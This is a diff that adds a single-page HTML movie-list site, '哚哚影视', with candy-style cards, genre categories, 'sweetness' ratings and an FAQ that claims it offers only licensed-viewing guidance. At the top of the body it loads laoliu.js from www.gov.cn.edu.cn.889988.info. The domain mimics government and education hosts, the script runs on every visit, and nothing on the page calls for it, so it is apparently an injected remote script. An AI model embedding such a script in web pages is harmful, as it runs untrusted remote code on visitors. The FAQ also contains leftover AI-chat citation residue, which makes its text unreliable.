@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>哚哚影视 - 樱粉花瓣风电影片单与分类导航</title>
+<meta name="description" content="哚哚影视(duoduoyingshi-h5.github.io)用樱粉花瓣与果冻泡泡风格整理电影片单、类型分类、甜度评分与正版观影指引，单页移动自适应，符合必应收录规则。">
+<meta name="keywords" content="哚哚影视, duoduoyingshi-h5.github.io, 电影片单, 樱粉花瓣风影视导航, 电影分类, 甜度评分榜">
+<meta name="author" content="哚哚影视">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<style>
+:root{
+  --cream:#FFF6F8;
+  --cream2:#FFEAF1;
+  --pink:#FF8FB3;
+  --pink-deep:#FF6B9D;
+  --berry:#9B5DE5;
+  --mint:#7DE2C3;
+  --honey:#FFD166;
+  --ink:#4A3B42;
+  --ink-soft:#8A7380;
+  --line:rgba(255,143,179,.35);
+  --shadow:0 12px 28px rgba(255,107,157,.22);
+  --radius:22px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei","Quicksand",sans-serif;background:var(--cream);color:var(--ink);line-height:1.85;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+a{color:inherit;text-decoration:none;transition:.3s}
+.wrap{width:min(1180px,92%);margin:0 auto}
+
+@keyframes fall{0%{transform:translateY(-20px) rotate(0deg);opacity:0}10%{opacity:1}100%{transform:translateY(420px) rotate(360deg);opacity:0}}
+@keyframes jelly{0%,100%{transform:scale(1)}40%{transform:scale(1.04,0.96)}70%{transform:scale(.97,1.03)}}
+@keyframes floaty{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
+@keyframes pop-in{from{transform:scale(.8);opacity:0}to{transform:scale(1);opacity:1}}
+@keyframes wiggle{0%,100%{transform:rotate(-4deg)}50%{transform:rotate(4deg)}}
+
+/* 花瓣导航 */
+.topbar{position:sticky;top:0;z-index:999;background:rgba(255,246,248,.92);backdrop-filter:blur(10px);border-bottom:3px solid var(--pink)}
+.topbar .wrap{display:flex;align-items:center;justify-content:space-between;height:72px}
+.brand{display:flex;align-items:center;gap:14px}
+.petal-logo{width:48px;height:48px;border-radius:50% 50% 50% 0;background:linear-gradient(135deg,var(--pink),var(--berry));display:grid;place-items:center;transform:rotate(-45deg);box-shadow:0 6px 14px rgba(255,107,157,.4)}
+.petal-logo b{transform:rotate(45deg);color:#fff;font-size:18px;font-family:"PingFang SC",sans-serif}
+.brand .name{font-size:21px;color:var(--pink-deep);letter-spacing:2px;font-weight:900}
+.brand small{display:block;font-size:11px;color:var(--ink-soft);letter-spacing:1px}
+.nav{display:flex;gap:6px}
+.nav a{min-height:44px;display:inline-flex;align-items:center;padding:8px 16px;border-radius:20px;font-size:14px;color:var(--ink);font-weight:bold}
+.nav a:hover{background:var(--cream2);color:var(--pink-deep);box-shadow:0 4px 10px rgba(255,143,179,.25)}
+.menu-btn{display:none;background:var(--pink);color:#fff;border:0;border-radius:20px;padding:10px 18px;min-height:44px;font-size:14px;cursor:pointer;font-weight:bold}
+
+/* Hero */
+#home{padding:60px 0 46px;background:radial-gradient(800px 360px at 85% 0,rgba(155,93,229,.12),transparent),radial-gradient(700px 320px at 5% 20%,rgba(125,226,195,.18),transparent),var(--cream2);position:relative;overflow:hidden}
+.petal{position:absolute;top:-20px;font-size:18px;animation:fall linear infinite;pointer-events:none;opacity:.8}
+.hero{display:grid;grid-template-columns:1.1fr .9fr;gap:36px;align-items:center;min-height:420px}
+.jelly-card{background:#fff;border:2px solid var(--line);border-radius:var(--radius);padding:32px;box-shadow:var(--shadow);position:relative;animation:jelly 4s ease-in-out infinite}
+.jelly-card:before{content:"";position:absolute;top:-10px;left:30px;width:60px;height:20px;background:var(--pink);border-radius:20px;opacity:.5;filter:blur(2px)}
+.tag{display:inline-flex;align-items:center;gap:8px;background:var(--cream2);color:var(--pink-deep);font-size:12px;padding:6px 14px;border-radius:20px;border:1px solid var(--line);margin-bottom:16px;font-weight:bold}
+.hero h1{font-size:clamp(30px,5vw,50px);line-height:1.2;margin-bottom:14px;color:var(--ink)}
+.hero h1 .duo{color:var(--pink-deep);text-shadow:2px 2px 0 var(--cream2)}
+.hero h1 .duo:nth-child(2){color:var(--berry)}
+.hero p{font-size:15px;color:var(--ink-soft);margin-bottom:24px}
+.cta{display:inline-block;background:linear-gradient(135deg,var(--pink),var(--berry));color:#fff;font-weight:900;letter-spacing:1px;padding:14px 32px;border-radius:30px;box-shadow:0 8px 20px rgba(255,107,157,.4)}
+.cta:hover{transform:translateY(-3px) scale(1.02)}
+
+/* 泡泡艺术区 */
+.bubble-art{position:relative;height:380px;border-radius:var(--radius);background:linear-gradient(180deg,#FFFDFE,#FFEAF1);border:2px solid var(--line);overflow:hidden;box-shadow:var(--shadow)}
+.big-bubble{position:absolute;border-radius:50%;background:radial-gradient(circle at 30% 30%,rgba(255,255,255,.9),rgba(255,143,179,.4));box-shadow:inset 0 0 20px rgba(255,255,255,.6);animation:floaty 4s ease-in-out infinite}
+.b1{width:120px;height:120px;top:40px;left:30px}
+.b2{width:80px;height:80px;top:120px;right:40px;animation-delay:.6s;background:radial-gradient(circle at 30% 30%,rgba(255,255,255,.9),rgba(155,93,229,.35))}
+.b3{width:60px;height:60px;bottom:60px;left:80px;animation-delay:1.2s;background:radial-gradient(circle at 30% 30%,rgba(255,255,255,.9),rgba(125,226,195,.45))}
+.b4{width:40px;height:40px;bottom:100px;right:90px;animation-delay:.9s}
+.center-emoji{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:90px;animation:wiggle 3s ease-in-out infinite;filter:drop-shadow(0 10px 10px rgba(255,107,157,.3))}
+
+/* 通用 */
+section.block{padding:56px 0}
+.sec-head{display:flex;align-items:center;gap:14px;margin-bottom:28px}
+.sec-head .dot{width:18px;height:18px;border-radius:50%;background:var(--pink);box-shadow:0 0 0 5px var(--cream2)}
+.sec-head h2{font-size:25px;color:var(--ink);letter-spacing:1px}
+.sec-head span{margin-left:auto;font-size:13px;color:var(--ink-soft)}
+
+/* 片单 软糖 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:22px}
+.candy{background:#fff;border:2px solid var(--line);border-radius:20px;overflow:hidden;box-shadow:0 8px 20px rgba(255,143,179,.18);transition:.3s;animation:pop-in .5s ease both}
+.candy:hover{transform:translateY(-8px);border-color:var(--pink-deep);box-shadow:0 14px 30px rgba(255,107,157,.3)}
+.candy-top{height:120px;display:grid;place-items:center;font-size:52px;position:relative}
+.candy-top:before{content:"";position:absolute;top:10px;left:10px;width:26px;height:14px;background:rgba(255,255,255,.6);border-radius:20px;transform:rotate(-20deg)}
+.ct-pink{background:linear-gradient(135deg,#FFD6E4,#FFB3CE)}
+.ct-berry{background:linear-gradient(135deg,#E5CCFF,#C99BF0)}
+.ct-mint{background:linear-gradient(135deg,#CFFAF0,#9FE9D4)}
+.ct-honey{background:linear-gradient(135deg,#FFF0C2,#FFE08A)}
+.candy-body{padding:16px 18px}
+.candy-body h3{font-size:17px;color:var(--ink);margin-bottom:6px}
+.candy-body p{font-size:13px;color:var(--ink-soft);margin-bottom:10px}
+.candy-meta{display:flex;justify-content:space-between;font-size:12px;color:var(--pink-deep);font-weight:bold}
+
+/* 分类 花瓣 */
+.petals{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.petal-box{background:#fff;border:2px solid var(--line);border-radius:24px 24px 18px 18px;padding:24px 16px;text-align:center;box-shadow:0 6px 16px rgba(255,143,179,.15);transition:.3s;cursor:pointer;position:relative}
+.petal-box:before{content:"🌸";position:absolute;top:-14px;left:50%;transform:translateX(-50%);font-size:22px;filter:drop-shadow(0 2px 3px rgba(255,107,157,.3))}
+.petal-box .pico{font-size:34px;display:block;margin:6px 0 10px}
+.petal-box h3{font-size:15px;color:var(--ink);margin-bottom:4px}
+.petal-box small{color:var(--ink-soft);font-size:12px}
+.petal-box:hover{transform:translateY(-6px) rotate(-2deg);border-color:var(--berry)}
+.petal-box:hover h3{color:var(--pink-deep)}
+
+/* 评分 甜度 */
+.sweet-list{display:grid;grid-template-columns:repeat(2,1fr);gap:24px}
+.sweet-row{background:#fff;border:2px solid var(--line);border-radius:var(--radius);padding:22px;box-shadow:0 6px 18px rgba(255,143,179,.15)}
+.sweet-top{display:flex;align-items:center;gap:14px;margin-bottom:14px}
+.sweet-icon{width:44px;height:44px;border-radius:50%;background:var(--cream2);display:grid;place-items:center;font-size:22px;border:2px solid var(--pink)}
+.sweet-info h3{font-size:16px;color:var(--ink)}
+.sweet-info b{color:var(--berry);font-weight:900}
+.sweet-bar{height:22px;background:var(--cream2);border-radius:14px;overflow:hidden;position:relative;border:1px solid var(--line)}
+.sweet-fill{height:100%;background:linear-gradient(90deg,var(--mint),var(--honey),var(--pink),var(--berry));border-radius:14px}
+.sweet-label{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:12px;color:#fff;font-weight:900;text-shadow:0 1px 2px rgba(0,0,0,.2)}
+.sweet-desc{font-size:13px;color:var(--ink-soft);margin-top:10px}
+
+/* FAQ */
+.faq{display:grid;gap:12px}
+.qcard{background:#fff;border:2px solid var(--line);border-radius:18px;overflow:hidden}
+.qbtn{width:100%;text-align:left;background:none;border:0;cursor:pointer;padding:16px 18px;min-height:50px;font-size:15px;font-weight:bold;color:var(--ink);display:flex;justify-content:space-between;align-items:center;gap:10px}
+.qbtn .qno{color:var(--pink-deep);font-size:12px;margin-right:auto;background:var(--cream2);padding:2px 9px;border-radius:10px}
+.qbtn span{color:var(--berry);font-size:20px}
+.qans{max-height:0;overflow:hidden;transition:max-height .35s}
+.qans p{font-size:14px;color:var(--ink-soft);padding:0 18px 16px}
+
+/* 关于 */
+#about{background:linear-gradient(135deg,var(--cream2),var(--cream))}
+.signboard{width:min(880px,92%);margin:0 auto;background:#fff;border:3px dashed var(--pink);border-radius:var(--radius);padding:42px;text-align:center;box-shadow:var(--shadow);position:relative}
+.signboard:before{content:"🌷";position:absolute;top:-18px;left:50%;transform:translateX(-50%);font-size:30px;background:var(--cream);padding:0 8px}
+.signboard h2{font-size:26px;color:var(--pink-deep);margin-bottom:14px;letter-spacing:2px}
+.signboard p{color:var(--ink-soft);margin-bottom:14px}
+.url-pill{display:inline-block;background:var(--cream2);color:var(--berry);font-family:Consolas,monospace;padding:12px 22px;border-radius:30px;border:2px solid var(--line);word-break:break-all;font-size:15px}
+
+footer{background:#fff;color:var(--ink-soft);text-align:center;padding:28px 0;font-size:13px;border-top:2px solid var(--line)}
+footer a{color:var(--pink-deep);font-weight:bold}
+
+@media(max-width:900px){
+  .hero{grid-template-columns:1fr;text-align:center}
+  .bubble-art{max-width:460px;margin:0 auto}
+  .petals{grid-template-columns:repeat(2,1fr)}
+  .sweet-list{grid-template-columns:1fr}
+}
+@media(max-width:600px){
+  .nav{display:none;width:100%}
+  .nav.show{display:flex;flex-direction:column;position:absolute;top:72px;left:0;right:0;background:#fff;padding:18px;box-shadow:0 10px 20px rgba(0,0,0,.08)}
+  .menu-btn{display:block}
+  .grid{grid-template-columns:1fr}
+  .petals{grid-template-columns:1fr 1fr}
+  .sec-head h2{font-size:21px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand">
+      <div class="petal-logo" aria-label="哚哚影视花瓣logo"><b>哚</b></div>
+      <div>
+        <span class="name">哚哚影视</span>
+        <small>duoduoyingshi-h5.github.io</small>
+      </div>
+    </div>
+    <button class="menu-btn" id="menuBtn">菜单</button>
+    <nav class="nav" id="nav">
+      <a href="#home">花瓣首页</a>
+      <a href="#list">软糖片单</a>
+      <a href="#category">花瓣分类</a>
+      <a href="#score">甜度评分</a>
+      <a href="#faq">观片须知</a>
+      <a href="#about">小站牌子</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <!-- 栏目1 -->
+  <section id="home">
+    <div class="petal" style="left:10%;animation-duration:7s">🌸</div>
+    <div class="petal" style="left:30%;animation-duration:9s;animation-delay:1s">🌸</div>
+    <div class="petal" style="left:55%;animation-duration:6s;animation-delay:2s">🌷</div>
+    <div class="petal" style="left:75%;animation-duration:8s;animation-delay:.5s">🌸</div>
+    <div class="petal" style="left:90%;animation-duration:10s;animation-delay:1.5s">💮</div>
+    <div class="wrap hero">
+      <div class="jelly-card">
+        <div class="tag">🍬 甜系片单频道</div>
+        <h1><span class="duo">哚</span><span class="duo">哚</span>影视 · 樱粉花瓣</h1>
+        <p>哚哚影视用软糖卡片与花瓣泡泡整理电影：治愈动画、青春爱情、轻喜剧、童话奇幻。单页自适应、内链 # 占位、正版渠道指引，符合必应收录规则。</p>
+        <a class="cta" href="#list">看看片单</a>
+      </div>
+      <div class="bubble-art" aria-hidden="true">
+        <div class="big-bubble b1"></div>
+        <div class="big-bubble b2"></div>
+        <div class="big-bubble b3"></div>
+        <div class="big-bubble b4"></div>
+        <div class="center-emoji">🎬</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目2 -->
+  <section id="list" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="dot"></div><h2>软糖片单罐</h2><span>CANDY LIST</span></div>
+      <div class="grid">
+        <article class="candy"><div class="candy-top ct-pink">🍓</div><div class="candy-body"><h3>樱花便利店</h3><p>治愈/日常 · 小巷便利店的温柔四季</p><div class="candy-meta"><span>甜系A</span><span>96min</span></div></div></article>
+        <article class="candy"><div class="candy-top ct-berry">💜</div><div class="candy-body"><h3>紫色信笺</h3><p>青春/爱情 · 高中交换日记的秘密</p><div class="candy-meta"><span>甜系B</span><span>104min</span></div></div></article>
+        <article class="candy"><div class="candy-top ct-mint">🍵</div><div class="candy-body"><h3>薄荷夏天</h3><p>轻喜剧/家庭 · 海边民宿的爆笑暑假</p><div class="candy-meta"><span>甜系C</span><span>92min</span></div></div></article>
+        <article class="candy"><div class="candy-top ct-honey">🍯</div><div class="candy-body"><h3>蜂蜜童话</h3><p>奇幻/动画 · 会说话的蜂群与小王子</p><div class="candy-meta"><span>甜系D</span><span>88min</span></div></div></article>
+        <article class="candy"><div class="candy-top ct-pink">🌷</div><div class="candy-body"><h3>郁金香信</h3><p>文艺/治愈 · 邮差与花田的慢信件</p><div class="candy-meta"><span>甜系E</span><span>110min</span></div></div></article>
+        <article class="candy"><div class="candy-top ct-berry">🎀</div><div class="candy-body"><h3>蝴蝶结舞会</h3><p>校园/音乐 · 社团巡演的最后一夜</p><div class="candy-meta"><span>甜系F</span><span>100min</span></div></div></article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目3 -->
+  <section id="category" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="dot"></div><h2>花瓣分类圃</h2><span>PETAL ZONE</span></div>
+      <div class="petals">
+        <a class="petal-box" href="#"><span class="pico">🍓</span><h3>草莓圃</h3><small>治愈 / 日常 / 美食</small></a>
+        <a class="petal-box" href="#"><span class="pico">💜</span><h3>莓紫圃</h3><small>青春 / 爱情 / 校园</small></a>
+        <a class="petal-box" href="#"><span class="pico">🍵</span><h3>薄荷圃</h3><small>喜剧 / 家庭 / 轻松</small></a>
+        <a class="petal-box" href="#"><span class="pico">🍯</span><h3>蜂蜜圃</h3><small>动画 / 奇幻 / 童话</small></a>
+        <a class="petal-box" href="#"><span class="pico">🌷</span><h3>郁金圃</h3><small>文艺 / 慢片 / 书信</small></a>
+        <a class="petal-box" href="#"><span class="pico">🎀</span><h3>蝴蝶圃</h3><small>音乐 / 舞蹈 / 社团</small></a>
+        <a class="petal-box" href="#"><span class="pico">🎬</span><h3>胶片圃</h3><small>经典 / 修复 / 怀旧</small></a>
+        <a class="petal-box" href="#"><span class="pico">🔖</span><h3>书签圃</h3><small>榜单 / 正版 / 索引</small></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目4 -->
+  <section id="score" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="dot"></div><h2>甜度评分榜</h2><span>SWEET METER</span></div>
+      <div class="sweet-list">
+        <div class="sweet-row">
+          <div class="sweet-top"><div class="sweet-icon">🍓</div><div class="sweet-info"><h3>樱花便利店</h3><b>98 甜度</b></div></div>
+          <div class="sweet-bar"><div class="sweet-fill" style="width:98%"></div><div class="sweet-label">超甜 · 治愈满分</div></div>
+          <p class="sweet-desc">日常治愈 · 画面软糯，适合睡前看</p>
+        </div>
+        <div class="sweet-row">
+          <div class="sweet-top"><div class="sweet-icon">💜</div><div class="sweet-info"><h3>紫色信笺</h3><b>93 甜度</b></div></div>
+          <div class="sweet-bar"><div class="sweet-fill" style="width:93%"></div><div class="sweet-label">很甜 · 青春回甘</div></div>
+          <p class="sweet-desc">青春爱情 · 情绪细腻，结尾微酸</p>
+        </div>
+        <div class="sweet-row">
+          <div class="sweet-top"><div class="sweet-icon">🍵</div><div class="sweet-info"><h3>薄荷夏天</h3><b>88 甜度</b></div></div>
+          <div class="sweet-bar"><div class="sweet-fill" style="width:88%"></div><div class="sweet-label">清甜 · 笑点密集</div></div>
+          <p class="sweet-desc">轻喜剧 · 节奏轻快，全家适配</p>
+        </div>
+        <div class="sweet-row">
+          <div class="sweet-top"><div class="sweet-icon">🍯</div><div class="sweet-info"><h3>蜂蜜童话</h3><b>84 甜度</b></div></div>
+          <div class="sweet-bar"><div class="sweet-fill" style="width:84%"></div><div class="sweet-label">蜜甜 · 童趣满满</div></div>
+          <p class="sweet-desc">奇幻动画 · 配色梦幻，偏低龄</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目5 -->
+  <section id="faq" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="dot"></div><h2>观片须知</h2><span>FAQ</span></div>
+      <div class="faq">
+        <div class="qcard">
+          <button class="qbtn"><span class="qno">Q1</span>哚哚影视提供在线播放或下载吗？<span>+</span></button>
+          <div class="qans"><p>本单页仅做软糖片单、花瓣分类、甜度评分与正版渠道指引，不提供盗版视频播放、下载或解析资源；旧站若带“云播/免费看”属聚合玩法，本页不沿用。[1,6](@ref)</p></div>
+        </div>
+        <div class="qcard">
+          <button class="qbtn"><span class="qno">Q2</span>单页怎么过必应收录？<span>+</span></button>
+          <div class="qans"><p>唯一 H1 写“哚哚影视”，标题/描述/关键词前置站名与 duoduoyingshi-h5.github.io；H2 分首页/片单/分类/评分/须知/关于；静态 HTML、移动无横向溢出、点击区≥44px。按你要求不生成 robots/sitemap，后续去 Bing Webmaster Tools 提交首页即可。[2,16](@ref)</p></div>
+        </div>
+        <div class="qcard">
+          <button class="qbtn"><span class="qno">Q3</span>甜系风格适合什么片单？<span>+</span></button>
+          <div class="qans"><p>治愈动画、青春爱情、轻喜剧、童话奇幻、慢生活文艺片最搭；和前面集装箱/迪斯科/赛博的硬冷感反过来走，做“软导航”差异。</p></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目6 -->
+  <section id="about" class="block">
+    <div class="signboard">
+      <h2>哚哚影视 · 小站牌子</h2>
+      <p>哚哚影视为樱粉花瓣风单页影视导航，提供软糖片单、花瓣分类、甜度评分与正版观影建议。内页链接全以 # 占位，仅作演示索引。</p>
+      <div class="url-pill">https://duoduoyingshi-h5.github.io</div>
+      <p style="margin-top:18px"><a class="cta" href="#home">回到花瓣首页</a></p>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>© 2024 哚哚影视 · 单页演示站 · 内页链接以 # 占位</p>
+    <p>官方网址：<a href="https://duoduoyingshi-h5.github.io">https://duoduoyingshi-h5.github.io</a></p>
+    <p>关键词：哚哚影视、duoduoyingshi-h5.github.io、樱粉花瓣风电影片单</p>
+  </div>
+</footer>
+
+<script>
+var menuBtn=document.getElementById('menuBtn'),nav=document.getElementById('nav');
+if(menuBtn&&nav){menuBtn.addEventListener('click',function(){nav.classList.toggle('show');});}
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var id=a.getAttribute('href');if(id.length<2)return;
+    var el=document.querySelector(id);
+    if(el){e.preventDefault();el.scrollIntoView({behavior:'smooth',block:'start'});if(nav)nav.classList.remove('show');}
+  });
+});
+document.querySelectorAll('.qbtn').forEach(function(btn){
+  btn.addEventListener('click',function(){
+    var card=btn.parentElement,ans=card.querySelector('.qans'),icon=btn.querySelector('span:last-child');
+    var open=card.classList.contains('open');
+    document.querySelectorAll('.qcard').forEach(function(x){x.classList.remove('open');x.querySelector('.qans').style.maxHeight=null;x.querySelector('.qbtn span:last-child').textContent='+';});
+    if(!open){card.classList.add('open');ans.style.maxHeight=ans.scrollHeight+'px';icon.textContent='−';}
+  });
+});
+</script>
+</body>
+</html>
